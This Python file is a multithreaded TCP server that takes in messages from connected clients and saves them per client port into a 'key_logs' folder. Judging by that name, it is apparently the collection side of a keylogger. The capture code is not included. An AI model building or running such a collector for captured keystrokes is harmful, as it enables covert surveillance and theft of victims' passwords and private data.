import os
import socket
import threading
from src import config, networking


def handle_input():
    while True:

        data = input().split(' ')
        match data[0]:

            case "exit":
                server.close()
                return
            
            case "close":
                for conn, addr in clients[:]:
                    if int(data[1]) == addr[1]:
                        networking.send(conn, config.DISCONNECT)
                        conn.close()
                        break


def save_file(addr):
    path = f"{PATH}\\{addr[1]}.txt"

    if os.path.exists(path):
        file = open(path, "a")
        file.write(' ')
    else:
        file = open(path, 'x')

    file.write(' '.join(datas[addr[1]]))
    file.close()
            

def handle_client(conn: socket.socket, addr):
    while True:
        try:
            data = networking.recv(conn)
        except:
            break

        if data == config.DISCONNECT:
            break
        
        datas[addr[1]].append(data)
        print(f"{addr}: {data}")
    save_file(addr)
    clients.remove((conn, addr))


def close():
    for conn, addr in clients:
        networking.send(conn, config.DISCONNECT)
        conn.close()


def main():
    global server
    if not os.path.exists(PATH):
        os.mkdir(PATH)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.bind(config.ADDR)
    except:
        server.close()
        return
    server.listen()
    threading.Thread(target=handle_input).start()

    while True:
        try:
            conn, addr = server.accept()
        except:
            close()
            break
        
        print("New connection!")
        if datas.get(addr, None) is None:
            datas[addr[1]] = []
        clients.append((conn, addr))
        threading.Thread(target=handle_client, args=(conn, addr)).start()


PATH = "key_logs"
server: socket.socket = ...
clients: list[tuple[socket.socket, str]] = []
datas = {}

if __name__ == "__main__":
    main()
